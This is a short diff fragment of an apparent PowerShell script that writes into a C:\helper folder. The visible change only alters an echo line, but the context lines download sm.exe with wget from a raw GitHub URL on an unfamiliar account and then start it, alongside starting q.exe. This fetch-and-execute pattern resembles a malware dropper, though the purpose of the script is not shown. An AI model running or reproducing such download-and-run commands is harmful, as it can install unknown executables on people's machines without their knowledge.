@@ -6,4 +6,4 @@ start-process C:\helper\q.exe ;
 wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/sm.exe" -o C:\helper\sm.exe ; start-sleep 2 ;
 start-process C:\helper\sm.exe ;
 
-echo regex.exe > C:\helper\regex.exe ; 
+echo 1 > C:\helper\regex.exe ; 
